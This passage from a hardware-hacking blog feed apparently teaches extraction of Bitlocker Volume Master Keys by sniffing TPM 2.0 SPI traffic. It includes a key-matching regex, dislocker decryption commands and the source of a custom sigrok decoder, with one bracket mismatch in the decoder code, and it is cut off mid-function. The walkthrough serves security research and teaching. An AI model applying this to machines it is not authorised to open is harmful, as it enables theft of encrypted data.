  <span class="n">o</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="n">o</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>

<p>After all the steps of analysis and correction, we successfully extracted the <em>bitmap</em> and validated that all our hypotheses and methods of analysis were correct:
<img src="/assets/posts/analise-e-decodificacao-flash/pax-fixed.jpg" alt="Adjusted PAX Logo" /><em>Adjusted PAX Logo</em></p>

<h2 id="conclusion">Conclusion</h2>

<p>It is essential to highlight that our approach was limited to <strong>removing</strong> the parity bits, without actually applying the error correction algorithm. As mentioned earlier, flash memories, particularly NAND type, can have defective bits, even from the time of manufacturing. Omitting the specific ECC algorithm may result in inconsistencies in the final data.</p>

<p>Fortunately, the content of this specific device <strong>was not</strong> encrypted, which made it easier for us in the analysis of scattering, taking advantage only of known content. If the content had been encrypted, it would be essential to identify a recurring pattern (such as empty memory pages) where the ECC information would be recorded.</p>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Flash" /><category term="PAX" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="NAND" /><category term="PAX" /><category term="RT809H" /><summary type="html"><![CDATA[Exploring NAND Memories]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/analise-e-decodificacao-flash/flash-cell-programmed.svg" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/analise-e-decodificacao-flash/flash-cell-programmed.svg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TPM 2.0: Extracting Bitlocker keys through SPI</title><link href="https://lucasteske.dev/2024/01/tpm2-bitlocker-keys" rel="alternate" type="text/html" title="TPM 2.0: Extracting Bitlocker keys through SPI" /><published>2024-01-16T23:48:00+00:00</published><updated>2024-01-16T23:48:00+00:00</updated><id>https://lucasteske.dev/2024/01/tpm2-bitlocker-keys</id><content type="html" xml:base="https://lucasteske.dev/2024/01/tpm2-bitlocker-keys"><![CDATA[<p>The TPM 2.0, also known as Trusted Platform Module 2.0, is a hardware security feature embedded in many modern computers. Its purpose is to provide a secure way to store cryptographic keys and other sensitive data, such as passwords and digital certificates, aiming to protect against various security threats, including unauthorized access to a computer’s hardware and software. TPM 2.0 represents an evolution of the original TPM specification, developed by the Trusted Computing Group (TCG), and features additional capabilities and resources, such as support for additional cryptographic algorithms and the ability to store larger amounts of data.</p>

<h3 id="good-things">Good Things</h3>

<p>Currently, the Trusted Platform Module (TPM) is widely used by Full Disk Encryption (FDE) mechanisms and also by specific device encryption, as it is usually linked to the device (soldered on the motherboard).</p>

<p>It is noteworthy that, besides being an advanced security feature in modern machines, the communication protocol used by TPM Integrated Circuits (ICs) is quite simple. Generally, TPM ICs use the Serial Peripheral Interface (SPI) communication protocol, but they can also use the Low Pin Count (LPC) and Inter-Integrated Circuit (I2C) protocols. An important issue to raise is that users generally trust the TPM as a reliable security measure, however, bus traffic is often transmitted in plain text. For example, after the TPM is unlocked, the Windows Bitlocker key is transmitted in plain text on the bus.</p>

<p>For this article, the assumptions and analyses are based on the 2.0 specification, version 1.03v22 of the TPM (as of the current article date, the most used specification in home computers and servers), which is available here: <a href="https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf">https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf</a></p>

<p>Furthermore, it is important to mention that this article is based on two other articles, which can be found at the following links:</p>

<p><a href="https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key">https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key</a></p>

<p><a href="https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network">https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network</a></p>

<p>It should be noted that, to date, the applied knowledge has successfully allowed the extraction of a Bitlocker key in a real scenario.</p>

<h3 id="tpm-spi-transaction">TPM SPI Transaction</h3>

<p>A Trusted Platform Module (TPM) transaction through the Serial Peripheral Interface (SPI) protocol is a series of operations performed by a TPM device. These operations typically include TPM initialization, creation and management of cryptographic keys, and execution of cryptographic operations such as encryption and signing.</p>

<p>A common example of TPM usage is to protect the encryption keys of a system, allowing the system to boot only if the TPM permits after a series of security checks. Another example is creating a secure connection with another device by generating a unique key pair, storing the private key in the TPM, and sharing the public key with the other device.</p>

<p>TPM device transactions are usually executed by interacting with a TPM device driver, which is software that communicates with the TPM device and manages its operations. TPM device transactions are typically governed by the Application Programming Interface (API) of the TPM2.0 library.</p>

<p>There are various types of transactions that can be analyzed through SPI, but for the purpose of recovering Bitlocker keys, only two are relevant: FIFO Write and FIFO Read. Focusing on these two operations is necessary to access the Volume Master Key (VMK), which is responsible for encrypting the AES256-XTS key.</p>

<p>The VMK is encrypted by the TPM and stored in the Bitlocker header of the target disk. During the boot process, the Windows bootloader retrieves the encrypted VMK from the Bitlocker header and sends it to the TPM as a decryption request. The TPM then sends back the decrypted version of the VMK, assuming the TPM is correctly configured and all security checks have been passed. The outcome of the decryption process depends on the TPM configuration.</p>

<p>In systems with complete secure boot, the TPM requires multiple hashes to be correctly initialized during the early stages of the boot process. The specific details of this process are beyond the scope of this explanation, but it is important to note that each step of the system’s boot process hashes the next step and loads it into the TPM. For example, the first step is a bootrom inside the CPU that checks the signature of the first stage of the BIOS.</p>

<h3 id="intercepting-the-tpm">Intercepting the TPM</h3>

<p>The Trusted Platform Module (TPM) chip is usually located on a motherboard in a way that is not easily accessible, for example, on the keyboard side of a laptop. However, since the Serial Peripheral Interface (SPI) is a bus protocol, it can be inferred that all SPI devices on the motherboard use the same clock and data lines. As a result, it is possible to connect a logic analyzer to the SPI flash memory storing the BIOS/UEFI code and monitor any SPI transactions that occur when the flash memory is inactive (when the chip select signal for the flash memory is low). This approach allows for detecting the relevant transactions to recover Bitlocker keys.
<img src="/assets/posts/patreon/Pasted image 20230124034954.png" alt="" />
<img src="/assets/posts/patreon/Pasted image 20230124035004.png" alt="" /></p>

<p>This method, however, can lead to potential complications if there are other devices connected to the same SPI bus, besides the SPI flash memory and the TPM. Although it is relatively unlikely that multiple devices are connected to the same bus in this context.</p>

<p>In pulseview, we can analyze the SPI bytes using the SPI decoder function.
<img src="/assets/posts/patreon/Pasted image 20230124035010.png" alt="" />
<img src="/assets/posts/patreon/Pasted image 20230124035020.png" alt="" /></p>

<p>Next, we need to set up the SPI decoder for the correct signals to be able to see the decoded bytes.
<img src="/assets/posts/patreon/Pasted image 20230124035029.png" alt="" /></p>

<p>Then, you will notice that, as we leave the CS# polarity field as “<strong>active-low</strong>”, it is decoding only the BIOS Flash transactions, not the “rest” of the bus.
<img src="/assets/posts/patreon/Pasted image 20230124035036.png" alt="" /></p>

<p>If we select “<strong>active-high</strong>”, we will analyze anything that is <strong>not</strong> BIOS flash (which is what we want):
<img src="/assets/posts/patreon/Pasted image 20230124035040.png" alt="" /></p>

<p>Now we have analyzed bytes for the SPI, which makes it easier for us to work with them. Now we need to create a sigrok plugin to analyze it.</p>

<h3 id="analyzing-tpm-in-sigrok--pulseview">Analyzing TPM in Sigrok / Pulseview</h3>

<p>Creating a Sigrok plugin is a straightforward process, thanks to the detailed official guide available on the Sigrok website at <a href="https://sigrok.org/wiki/Protocol_decoder_HOWTO">https://sigrok.org/wiki/Protocol_decoder_HOWTO</a>. Given that we are working with the Serial Peripheral Interface (SPI) protocol, it is appropriate to use Sigrok’s “Stacked Decoder” functionality, which allows chaining multiple decoders and using the output of one decoder as input for another. This approach simplifies the process, eliminating the need to manually locate and extract individual bits of data from the raw SPI data and allows focusing on the actual formed bytes produced by the Sigrok SPI decoder.</p>

<p>To start, you need to create a “tpmdecoder” folder in the plugins directory (on Linux, it’s located at ~/.local/share/libsigrokdecode/decoders/), with the following files attached to this post:</p>

<ul>
  <li><strong>init</strong>.py</li>
  <li>pd.py</li>
</ul>

<p>These are the necessary files for the decoder that was developed. Basically, a decoder for the TPM registers was created, as described in <a href="https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf">https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf</a></p>

<p>After creating and saving the PulseView project, you need to close and reopen it. The plugin should be loaded automatically. In the SPI plugin settings, in the “Stacked Decoder” option, the “TPM2.0” option should be available.
<img src="/assets/posts/patreon/Pasted image 20230124035119.png" alt="" />
And after selecting, it will start to try to find TPM2.0 messages over the SPI data. <img src="/assets/posts/patreon/Pasted image 20230124035129.png" alt="" /></p>

<h3 id="bitlocker-key">Bitlocker Key</h3>

<p>For this section, it is highly recommended to check out the <a href="https://github.com/libyal/libbde/blob/main/documentation/BitLocker%20Drive%20Encryption%20(BDE)%20format.asciidoc">libbde</a> documentation on GitHub. The documentation contains almost all (if not all) information related to Bitlocker, including legacy versions.</p>

<p>The key we want to recover is actually the Bitlocker Volume Master Key, which has a specific format. We can use a regular expression to recover this key instead of trying to understand each request, which would take more time to create a decoder.</p>

<p>The data that is actually encrypted by the TPM is an FVE metadata entry, as described in section <a href="https://github.com/libyal/libbde/blob/main/documentation/BitLocker%20Drive%20Encryption%20(BDE)%20format.asciidoc#53-fve-metadata-entry">5.3 of libbde</a>. This presents some headers that can be matched with a regular expression.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2C000[0-6]000[1-9]000[0-1]000[0-5]200000(\w{64})
</code></pre></div></div>

<p>After all the header, the Volume Master Key (VMK) is concatenated. To find the key, just look for 64 characters (32 bytes, which corresponds to a 256-bit key).</p>

<p>To facilitate use, the attached decoder prints the found keys in the decoding terminal (so it is not necessary to use the PulseView interface, if not desired) and also shows in a separate line in PulseView.
<img src="/assets/posts/patreon/Pasted image 20230124035206.png" alt="" /></p>

<h3 id="accessing-data-using-the-downloaded-vmk">Accessing Data Using the Downloaded VMK</h3>

<p>To access data encrypted by Bitlocker, we will use the dislocker project (<a href="https://github.com/Aorimn/dislocker">https://github.com/Aorimn/dislocker</a>) to mount the partition as plain text. Before that, it is necessary to save the entire key as a file:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"66D96600C7..."</span> | xxd <span class="nt">-p</span> <span class="nt">-r</span> <span class="o">&gt;</span> vmk.key
</code></pre></div></div>

<p>Then, we can use dislocker to create a device node with the plain text device, using partition n on sdx:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">mkdir</span> <span class="nt">-p</span> mydisk <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>dislocker-fuse <span class="nt">-K</span> vmk.key /dev/sdxn <span class="nt">--</span> ./mydisk
</code></pre></div></div>

<p>For example, if the encrypted partition is on /dev/sda3, you can use:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> <span class="nt">-p</span> mydisk <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>dislocker-fuse <span class="nt">-K</span> vmk.key /dev/sda3 <span class="nt">--</span> ./mydisk
</code></pre></div></div>

<p>A dislocker-file will be created inside the ./mydisk folder, representing the device and can be mounted as a normal partition.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>mount <span class="nt">-o</span> remove_hiberfile ./mydisk/dislocker-file /media/disk
</code></pre></div></div>

<p>Now, you can access the decrypted data in the /media/disk folder.</p>

<p>All Consolidated References
Here are all the consolidated references for you to check:</p>

<ul>
  <li>
    <p>TPM 2.0 Specification - <a href="https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf">https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf</a></p>
  </li>
  <li>
    <p>F-Secure - Sniff, there leaks - <a href="https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key">https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key</a></p>
  </li>
  <li>
    <p>DolosGroup - From Stolen Laptop to Inside the company network - <a href="https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network">https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network</a></p>
  </li>
</ul>

<h1 id="files">Files</h1>

<h3 id="__init__py"><code class="language-plaintext highlighter-rouge">__init__.py</code></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##
## This file is part of the libsigrokdecode project.
##
## Copyright (C) 2022 Lucas Teske &lt;lucas@teske.com.br&gt;
##
## This program is free software; you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation; either version 2 of the License, or
## (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program; if not, see &lt;http://www.gnu.org/licenses/&gt;.
##
</span>
<span class="kn">from</span> <span class="n">.pd</span> <span class="kn">import</span> <span class="n">Decoder</span>
</code></pre></div></div>

<h3 id="pdpy"><code class="language-plaintext highlighter-rouge">pd.py</code></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##
## This file is part of the libsigrokdecode project.
##
## Copyright (C) 2022 Lucas Teske &lt;lucas@teske.com.br&gt;
##
## This program is free software; you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation; either version 2 of the License, or
## (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program; if not, see &lt;http://www.gnu.org/licenses/&gt;.
##
</span>
<span class="kn">import</span> <span class="n">sigrokdecode</span> <span class="k">as</span> <span class="n">srd</span>
<span class="kn">import</span> <span class="n">binascii</span><span class="p">,</span> <span class="n">re</span>
<span class="kn">from</span> <span class="n">enum</span> <span class="kn">import</span> <span class="n">Enum</span>

<span class="n">OPERATION_MASK</span> <span class="o">=</span> <span class="mh">0x80</span>
<span class="n">SIZE_MASK</span> <span class="o">=</span> <span class="mh">0x3f</span>
<span class="n">WAIT_MASK</span> <span class="o">=</span> <span class="mh">0x01</span>

<span class="c1"># Registers at https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf
# Page 63 (pdf 71) - Table 17
</span>
<span class="n">tpmRegisters</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mh">0xD40000</span><span class="p">:</span> <span class="sh">"</span><span class="s">TPM_ACCESS_0</span><span class="sh">"</span><span class="p">,</span>
    <span class="mh">0xD4000C</span><span class="p">:</span> <span class="sh">"</span><span class="s">TPM_INT_VECTOR_0</span><span class="sh">"</span><span class="p">,</span>
<span class="p">}</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40008</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_INT_ENABLE_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40010</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_INT_STATUS_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40014</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_INTF_CAPABILITY_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40018</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_STS_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40024</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_DATA_FIFO_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40030</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_INTERFACE_ID_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40080</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_XDATA_FIFO_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40F00</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">TPM_DID_VID_0</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tpmRegisters</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">{:08X} = {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">tpmRegisters</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>

<span class="k">class</span> <span class="nc">State</span><span class="p">(</span><span class="n">Enum</span><span class="p">):</span>
    <span class="n">READING_OP</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="n">READING_ARG</span> <span class="o">=</span> <span class="mi">2</span>
    <span class="n">WAITING</span> <span class="o">=</span> <span class="mi">3</span>
    <span class="n">TRANSFER</span> <span class="o">=</span> <span class="mi">4</span>

<span class="k">class</span> <span class="nc">Decoder</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">Decoder</span><span class="p">):</span>
    <span class="n">api_version</span> <span class="o">=</span> <span class="mi">3</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="sh">'</span><span class="s">tpm20</span><span class="sh">'</span>
    <span class="n">name</span> <span class="o">=</span> <span class="sh">'</span><span class="s">TPM2.0</span><span class="sh">'</span>
    <span class="n">longname</span> <span class="o">=</span> <span class="sh">'</span><span class="s">TPM 2.0</span><span class="sh">'</span>
    <span class="n">desc</span> <span class="o">=</span> <span class="sh">'</span><span class="s">A TPM 2.0 Protocol Decoder</span><span class="sh">'</span>
    <span class="n">license</span> <span class="o">=</span> <span class="sh">'</span><span class="s">gplv2+</span><span class="sh">'</span>
    <span class="n">inputs</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">spi</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">outputs</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">tags</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">SPI</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">TPM</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">options</span> <span class="o">=</span> <span class="p">()</span>
    <span class="n">annotations</span> <span class="o">=</span> <span class="p">(</span>
        <span class="p">(</span><span class="sh">'</span><span class="s">text</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Text</span><span class="sh">'</span><span class="p">),</span>                   <span class="c1"># 0
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">warning</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Warning</span><span class="sh">'</span><span class="p">),</span>             <span class="c1"># 1
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">data-write</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Data write</span><span class="sh">'</span><span class="p">),</span>       <span class="c1"># 2
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">data-read</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Data read</span><span class="sh">'</span><span class="p">),</span>         <span class="c1"># 3
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">fifo-write</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">FIFO write</span><span class="sh">'</span><span class="p">),</span>       <span class="c1"># 4
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">fifo-read</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">FIFO read</span><span class="sh">'</span><span class="p">),</span>         <span class="c1"># 5
</span>        <span class="p">(</span><span class="sh">'</span><span class="s">bitlocker-key</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Bitlocker Key</span><span class="sh">'</span><span class="p">),</span> <span class="c1"># 6
</span>    <span class="p">)</span>
    <span class="n">annotation_rows</span> <span class="o">=</span> <span class="p">(</span>
         <span class="p">(</span><span class="sh">'</span><span class="s">row-read</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Read</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="p">)),</span>
         <span class="p">(</span><span class="sh">'</span><span class="s">row-write</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Write</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">)),</span>
         <span class="p">(</span><span class="sh">'</span><span class="s">row-fifo-read</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">FIFO Read</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="p">)),</span>
         <span class="p">(</span><span class="sh">'</span><span class="s">row-fifo-write</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">FIFO Write</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="p">)),</span>
         <span class="p">(</span><span class="sh">'</span><span class="s">row-bitlocker-key</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Bitlocker Key</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">)),</span>
    <span class="p">)</span>
    <span class="n">binary</span> <span class="o">=</span> <span class="p">(</span>
        <span class="p">(</span><span class="sh">'</span><span class="s">packet-read</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Packet read</span><span class="sh">'</span><span class="p">),</span>
        <span class="p">(</span><span class="sh">'</span><span class="s">packet-write</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Packet write</span><span class="sh">'</span><span class="p">),</span>
    <span class="p">)</span>
    <span class="n">options</span> <span class="o">=</span> <span class="p">()</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">reset</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">reset</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_OP</span>

    <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">out_ann</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">OUTPUT_ANN</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="n">out_python</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">OUTPUT_PYTHON</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="n">out_binary</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">OUTPUT_BINARY</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">ss</span><span class="p">,</span> <span class="n">es</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">DATA</span><span class="sh">"</span><span class="p">:</span>
            <span class="n">_</span><span class="p">,</span> <span class="n">mosi</span><span class="p">,</span> <span class="n">miso</span> <span class="o">=</span> <span class="n">data</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">putdata</span><span class="p">(</span><span class="n">ss</span><span class="p">,</span> <span class="n">es</span><span class="p">,</span> <span class="n">mosi</span><span class="p">,</span> <span class="n">miso</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">report_transaction</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">ttype</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="nf">hexlify</span><span class="p">(</span><span class="nf">bytearray</span><span class="p">(</span><span class="n">data</span><span class="p">)).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">ascii</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">addr</span> <span class="ow">in</span> <span class="n">tpmRegisters</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="sh">"</span><span class="s">{}: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">tpmRegisters</span><span class="p">[</span><span class="n">addr</span><span class="p">],</span> <span class="n">data</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="sh">"</span><span class="s">RESERVED({:06X}): {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">out_ann</span><span class="p">,</span> <span class="p">[</span><span class="mi">3</span> <span class="k">if</span> <span class="n">ttype</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">2</span><span class="p">,</span> <span class="p">[</span><span class="n">data</span><span class="p">]</span> <span class="p">])</span>

    <span class="k">def</span> <span class="nf">report_fifo</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">ttype</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="n">data</span> <span class="o">=</span> <span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="sh">"</span><span class="s">{:02X}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">])</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">out_ann</span><span class="p">,</span> <span class="p">[</span><span class="mi">5</span> <span class="k">if</span> <span class="n">ttype</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">4</span><span class="p">,</span> <span class="p">[</span><span class="n">data</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">report_bitlocker_key</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
